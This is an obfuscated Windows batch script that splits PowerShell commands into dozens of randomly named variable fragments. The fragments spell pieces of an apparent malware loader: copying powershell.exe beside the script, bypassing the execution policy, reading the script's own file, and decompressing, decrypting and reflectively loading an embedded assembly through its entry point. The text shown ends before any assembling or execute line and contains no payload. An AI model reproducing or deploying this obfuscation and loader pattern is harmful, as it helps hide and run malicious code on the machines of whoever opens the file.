@echo off
set "CoyVbvLYfO=Po"
set "gkGRVQzMII=he"
set "qnVwYSZHYL=we"
set "tmYpjsiEAO= /"
set "CioIvxvPwF=ll"
set "gsaHfHzxIX=ll"
set "zltkNSrgvA=do"
set "EuiXqCiCBl=Sy"
set "JhEAxoSOyn=\W"
set "qbdaDCXWdV=in"
set "HqQMSgEyde=st"
set "bOjbkMDzwu= C"
set "VaaFvRxWOF=ws"
set "xOZJqrkEyx=32"
set "EdMhktqTvY=.e"
set "uottJtgdkL=1."
set "qcrgAcxyHC=y "
set "uoACXxOuNE=we"
set "dEnDmYVemV=nd"
set "zgndWIijqy=Wi"
set "NffwIpSYjh=co"
set "EIBquUAgeC=s\"
set "nPTVHZKjUU=py"
set "KqluxDLKTK=0\"
set "jdmJvfGdAh=xe"
set "QDPHKbRYOB=po"
set "gwfNjCucID=:\"
set "cdjjJRVzCL=\v"
set "AwnWmLROLf=rs"
set "YcxlTvcXir=em"
set "eahxslMxis=he"
set "LtBOaRJfLe=ow"
set "WLsYspbxFM=rS"
set "ujIKtJmZvG= %~dp0"
set "WpIyvQHnvI=cd"
set "WtQxjVmXbs=kk.D"
set "QBVZXncvzn=x) {"
set "afhUdUWqrt=oint"
set "vdzngTTwRl=embl"
set "DOoVxxYLju=)($z"
set "LrtirbyYJq=eam("
set "OuvyvSNmhK=PTtG"
set "wDrieMvPpX=O.Me"
set "dPPHdHplEN=6] -"
set "pIhqRvXiGk=zzqT"
set "JBcSWbDBTg=.Cre"
set "mOoDDzXqIJ=ress"
set "MkCYVRsHbk=lulI"
set "pfAjnUuzwE=)) {"
set "zaSccPpfHa=tS46"
set "KhprToUGIl=pose"
set "aERDbjNbBG='')("
set "thTekVWvBO=L4Yi"
set "yLUAtBhnHd=yste"
set "KlWHUcBApJ=);$H"
set "vsXlnWNPBP=[Sys"
set "zwsfzhYVLT=ateD"
set "lgTSRMoQmL=nage"
set "ApxGizIsGT=$zkA"
set "FNnAzaSpGj=tryP"
set "lXueqFYAVl===')"
set "fNzrQtrlfi=);$O"
set "xBxviOByUg= = ["
set "MfPHFAwomy=::('"
set "MMgyrleggH=k; }"
set "crIQYkFjpO=-ep "
set "GEWKwzVBeI=ach "
set "fHdtYBkmYF=y.Pa"
set "PZUXvEGJCy=m.IO"
set "AQnCoqTrFJ=Disp"
set "ZFNkSJbQYt=n ''"
set "mteGvkJXAM=Ui.T"
set "PbyQAiiQzO=Secu"
set "ZfshrxTmPh=Bmor"
set "phEbesubpV=stem"
set "MkvtwvUhnv== $g"
set "iwBYBqVSok=ew-O"
set "upAFwXyBjX='txe"
set "DFOSEnBZbw=; };"
set "uBJhSPeifx=.Mod"
set "tplDbgntfC=PxEW"
set "PGyEqJPNNi=ionM"
set "BcrSARenwm=Comp"
set "CgBGowDepe=lulI"
set "CAjhIsDiTG=join"
set "zBAyBxXfqL=eXy "
set "hlUdHsotxz=sion"
set "jvMFayQLaO=trea"
set "gldveZDxUF=;$xc"
set "LsCBlivzIH=VSo "
set "tVzSFIfvai=lulI"
set "aBkufqzMJC=stem"
set "zSxOMQSejV=]::C"
set "qkjLLYkmyM=ring"
set "KvZhOmsOmI=($Sr"
set "yzpSglsagp=ddin"
set "nfKdnFXXEo=[Sys"
set "SmXOIkyvOo=-Obj"
set "oRbkvBwWyg=Nm);"
set "CuJbhcQkmh=oL'["
set "FrbjZcsXGn=lulI"
set "zWGRdACtZQ=6esa"
set "IAgMYPParS=y]::"
set "tktSkjfChQ=wUi "
set "QRWMJyNDeq=gth)"
set "xAeNDdWsYS=g = "
set "AnNkfNAgUi=F'[-"
set "bBcwDVHwXs=iron"
set "uKNrkHgASC=flec"
set "qtrfjwDmQl=$zkA"
set "fssFGpqbfw=('%~f0'"
set "ntkaywjTyU=ss -"
set "KbtiXpHbnj=[Sys"
set "oBkGKmVSFe=[-1."
set "QYIJEZaRtz=bstr"
set "EjJIQXxvbZ=$UFC"
set "JTGUlnLzRE=16] "
set "VblwnrJuJs=Obje"
set "IEQYhTMNWQ=.Dis"
set "nGiXkRpgKZ=nirt"
set "CwhTeDupcw=Obje"
set "beuteJMoXk=oArr"
set "uZUBCVaUHN=ose("
set "ojgmelosjo=lBlo"
set "ZNPOCHQXHX= = $"
set "eReioorxHg=o.Su"
set "vUffRzGgPU=VSo."
set "OmEDKvHhbR=m, 0"
set "xqRbRTbFqr=$Hzz"
set "NbRlWHTppt=pres"
set "OMjkPJhHrC=$Yzq"
set "QjCjVcPTrs=y.Ci"
set "dCASKKFxWT= [Sy"
set "tlzJYdrywM=File"
set "ljtcbcBVEG=, $z"
set "pmKABgogxq=YxVw"
set "CYIuIVpRnp=bypa"
set "mywunljCFT=ert]"
set "teGjbMzZHr=rtS4"
set "fKvKNcvDVd= [Sy"
set "bAskZVDMCR=comp"
